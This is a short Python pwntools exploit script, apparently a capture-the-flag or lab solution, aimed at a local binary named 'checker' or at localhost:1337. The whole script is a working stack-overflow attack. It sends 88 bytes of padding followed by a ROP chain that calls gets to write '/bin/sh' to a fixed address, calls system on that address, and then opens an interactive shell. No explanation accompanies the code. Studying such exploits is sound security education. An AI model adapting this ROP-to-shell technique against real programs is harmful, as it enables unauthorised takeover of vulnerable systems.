from pwn import *
#context.log_level='DEBUG'

p = process("./checker")
elf = ELF("./checker", checksec=False)
libc = elf.libc
rop = ROP(elf)

def start():
	if not args.REMOTE:
		return process("./checker")
	else:
		return remote("localhost", 1337)

p = start()

def main():

	global rop

	pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0] # pop rdi; ret
	gets = elf.plt['gets']
	system = elf.plt['system']
	where_to_write = 0x601060

	payload = ""
	payload += "A"*88
	payload += p64(pop_rdi)
	payload += p64(where_to_write)
	payload += p64(gets)
	payload += p64(pop_rdi)
	payload += p64(where_to_write)
	payload += p64(system)

	p.sendline(payload)
	p.sendline("/bin/sh")

	p.interactive()

if __name__=="__main__":
	main()
